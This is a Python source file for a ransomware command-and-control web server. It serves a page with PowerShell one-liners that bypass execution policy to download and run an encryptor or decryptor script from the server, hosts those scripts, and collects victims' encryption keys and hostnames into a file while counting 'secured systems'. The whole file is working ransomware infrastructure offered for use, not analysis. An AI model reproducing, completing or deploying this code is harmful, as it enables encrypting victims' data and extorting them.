from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
import os

# Global variable to track secured systems
secured_systems = set()

class KeyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            # Display a webpage with one-liner commands and copy buttons
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()

            host = self.headers['Host']
            count_secured = len(secured_systems)

            html_content = f"""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8" />
                <title>Ransomware Server</title>
                <style>
                    body {{
                        margin: 0;
                        padding: 0;
                        background-color: #222;
                        font-family: Arial, sans-serif;
                        color: #fff;
                    }}
                    .container {{
                        width: 90%;
                        max-width: 700px;
                        margin: 40px auto;
                        background-color: #333;
                        border-radius: 6px;
                        padding: 20px;
                    }}
                    h1 {{
                        text-align: center;
                        margin-bottom: 30px;
                    }}
                    .command-container {{
                        display: flex;
                        align-items: center;
                        margin-bottom: 20px;
                    }}
                    .command-label {{
                        font-weight: bold;
                        margin-bottom: 5px;
                    }}
                    code {{
                        background-color: #444;
                        color: #0f0;
                        padding: 10px;
                        border-radius: 4px;
                        flex: 1;
                        margin-right: 8px;
                        overflow-wrap: break-word;
                    }}
                    button {{
                        background-color: #4CAF50;
                        border: none;
                        color: white;
                        padding: 10px 16px;
                        text-align: center;
                        text-decoration: none;
                        display: inline-block;
                        font-size: 14px;
                        border-radius: 4px;
                        cursor: pointer;
                        transition: background-color 0.3s ease;
                    }}
                    button:hover {{
                        background-color: #45A049;
                    }}
                    .system-count {{
                        text-align: center;
                        margin-top: 30px;
                        font-size: 1.1em;
                    }}
                    .system-count span {{
                        font-weight: bold;
                    }}
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Ransomware Server</h1>

                    <div class="command-container">
                        <code id="encryptCommand">
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://{host}/script/encryptor.ps1 -OutFile encryptor.ps1; .\\encryptor.ps1"
                        </code>
                        <button onclick="copyToClipboard('encryptCommand')">Copy</button>
                    </div>

                    <div class="command-container">
                        <code id="decryptCommand">
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://{host}/script/decryptor.ps1 -OutFile decryptor.ps1; .\\decryptor.ps1"
                        </code>
                        <button onclick="copyToClipboard('decryptCommand')">Copy</button>
                    </div>

                    <div class="system-count">
                        Number of secured systems: <span id="securedCount">{count_secured}</span>
                    </div>
                </div>

                <script>
                    function copyToClipboard(elementId) {{
                        const commandElement = document.getElementById(elementId);
                        // Trim any extra whitespace/newlines
                        const textToCopy = commandElement.textContent.trim();

                        if (!navigator.clipboard) {{
                            // Fallback approach for older browsers or if not served over HTTPS
                            const textArea = document.createElement('textarea');
                            textArea.value = textToCopy;
                            document.body.appendChild(textArea);
                            textArea.select();
                            document.execCommand('copy');
                            document.body.removeChild(textArea);
                            alert('Copied to clipboard (fallback)!');
                            return;
                        }}

                        navigator.clipboard.writeText(textToCopy).then(() => {{
                            alert('Copied to clipboard!');
                        }}).catch((err) => {{
                            console.error('Failed to copy: ', err);
                            // Fallback approach
                            const textArea = document.createElement('textarea');
                            textArea.value = textToCopy;
                            document.body.appendChild(textArea);
                            textArea.select();
                            document.execCommand('copy');
                            document.body.removeChild(textArea);
                            alert('Copied to clipboard (fallback)!');
                        }});
                    }}
                </script>
            </body>
            </html>
            """
            self.wfile.write(html_content.encode('utf-8'))

        elif self.path.startswith('/script/'):
            # Serve the PowerShell scripts
            script_name = self.path.split('/')[-1]
            script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), script_name)
            if os.path.exists(script_path):
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{script_name}"')
                self.end_headers()
                with open(script_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'File not found.')

        elif self.path == '/stats':
            # Return the number of secured systems
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            response = {"secured_systems": len(secured_systems)}
            self.wfile.write(json.dumps(response).encode('utf-8'))

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

    def do_POST(self):
        if self.path == '/store_key':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')

                data = json.loads(post_data)
                encryption_key = data.get('key')
                hostname = data.get('hostname')

                if not encryption_key or not hostname:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"Bad Request: Missing 'key' or 'hostname'.")
                    return

                with open('encryption_keys.txt', 'a') as f:
                    f.write(f"Hostname: {hostname}, Key: {encryption_key}\n")

                secured_systems.add(hostname)

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'Key and hostname received and stored.')
            except Exception as e:
                print(f"Error processing POST request: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'Internal Server Error')
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

def get_local_ip():
    """Get the local machine's IP address."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
        return ip
    except Exception:
        return "127.0.0.1"

def run(server_class=HTTPServer, handler_class=KeyHandler, port=8000):
    local_ip = get_local_ip()
    print(f'Starting server on http://{local_ip}:{port}')
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

if __name__ == '__main__':
    run()


